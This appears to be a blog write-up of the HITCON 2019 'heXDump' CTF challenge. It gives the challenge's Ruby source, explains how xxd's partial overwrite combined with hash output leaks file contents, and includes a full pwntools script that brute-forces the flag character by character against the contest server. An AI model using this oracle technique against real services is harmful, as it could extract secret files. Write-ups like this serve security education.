---
layout: post
title: "HITCON 2019 / heXDump"
permalink: /hitcon-2019-hexdump
---

In this challenge, we are given the following ruby script:

```ruby
#!/usr/bin/env ruby
# encoding: ascii-8bit
# frozen_string_literal: true
 
 
require 'English'
require 'fileutils'
require 'securerandom'
 
 
FLAG_PATH = File.join(ENV['HOME'], 'flag')
DEFAULT_MODE = "sha1sum %s | awk '{ print $1 }'"
 
 
def setup
  STDOUT.sync = 0
  STDIN.sync = 0
  @mode = DEFAULT_MODE
  @file = '/tmp/' + SecureRandom.hex
  FileUtils.touch(@file)
  @key = output("sha256sum #{FLAG_PATH} | awk '{ print $1 }'").strip
  raise if @key.size != 32 * 2
end
 
 
def menu
  <<~MENU
    1) write
    2) read
    3) change output mode
    0) quit
  MENU
end
 
 
def output(cmd)
  IO.popen(cmd, &:gets)
end
 
 
def write
  puts 'Data? (In hex format)'
  data = gets
  return false unless data && !data.empty? && data.size < 0x1000
 
 
  IO.popen("xxd -r -ps - #{@file}", 'r+') do |f|
    f.puts data
    f.close_write
  end
  return false unless $CHILD_STATUS.success?
 
 
  true
end
 
 
def read
  unless File.exist?(@file)
    puts 'Write something first plz.'
    return true
  end
 
 
  puts output(format(@mode, @file))
  true
end
 
 
def mode_menu
  <<~MODE
    Which mode?
    - SHA1
    - MD5
    - AES
  MODE
end
 
 
def change_mode
  puts mode_menu
  @mode = case gets.strip.downcase
          when 'sha1' then "sha1sum %s | awk '{ print $1 }'"
          when 'md5' then "md5sum %s | awk '{ print $1 }'"
          when 'aes' then "openssl enc -aes-256-ecb -in %s -K #{@key} | xxd -ps"
          else DEFAULT_MODE
          end
end
 
 
def secret
  FileUtils.cp(FLAG_PATH, @file)
  true
end
 
 
def main_loop
  puts menu
  case gets.to_i
  when 1 then write
  when 2 then read
  when 3 then change_mode
  when 1337 then secret
  else false
  end
end
 
 
setup
begin
  loop while main_loop
  puts 'See ya!'
ensure
  FileUtils.rm_f(@file)
end
```

`write` allows us to write to the temporary file created and `read` prints out the content of the file as md5/sha1 hashed or aes256 encrypted using the sha256 hash of the flag as the key.

There is also `secret` which is not included in the menu. It simply copies the flag into our temporary file.

`write` uses `xxd` to convert hexadecimal string to bytes. However, this operation overwrites the file from the start of it instead of overwriting the whole file.

```bash
$ printf '414243444546' | xxd -r -ps - test && cat test
ABCDEF
$ printf '6162' | xxd -r -ps - test && cat test
abCDEF
```

We can use this to brute force the flag one character at a time.

In order to find the length of the flag, we will copy the flag into the file first, Then, we will overwrite its characters one by one until, the hash of the file matches the hash of the characters we have sent so far.

After finding the length of the flag, we will simply overwrite all characters of it except the last one and read its hash. Then, we will just brute force that character and move on to the next character from the end of the string. We will repeat this until we get all the characters.

Here is the full script:

```python
#!/usr/bin/env python
#-*- coding: utf-8 -*-
from hashlib import sha1
from pwn import *
from string import printable
context.log_level = 'error'
 
 
HOST = '13.113.205.160'
PORT = 21700
 
 
def choose(r, option):
    r.recvuntil('quit\n')
    r.sendline(str(option))
 
 
def write(r, data):
    choose(r, 1)
    r.recvline()
    r.sendline(data.encode('hex'))
 
 
def read(r):
    choose(r, 2)
    return r.recvline().rstrip()
 
 
def secret(r):
    choose(r, 1337)
 
 
def find_length():
    for length in xrange(1, 100):
        s = 'A' * length
        with remote(HOST, PORT) as r:
            secret(r)
            write(r, s)
            if read(r) == sha1(s).hexdigest():
                return length
    raise Exception('Could not find the length!')
 
 
def find_char(flag, i):
    with remote(HOST, PORT) as r:
        secret(r)
        write(r, 'A' * (i - 1))
        sha1_hash = read(r)
    for c in printable:
        s = 'A' * (i - 1) + c + flag
        if sha1_hash == sha1(s).hexdigest():
            return c
    raise Exception('Could not find char #{}!'.format(i))
 
 
def main():
    length = find_length()
    print 'Length: {}'.format(length)
    flag = ''
    for i in xrange(length, 0, -1):
        flag = find_char(flag, i) + flag
    print 'Flag: {}'.format(flag)
 
 
if __name__ == '__main__':
    main()
```
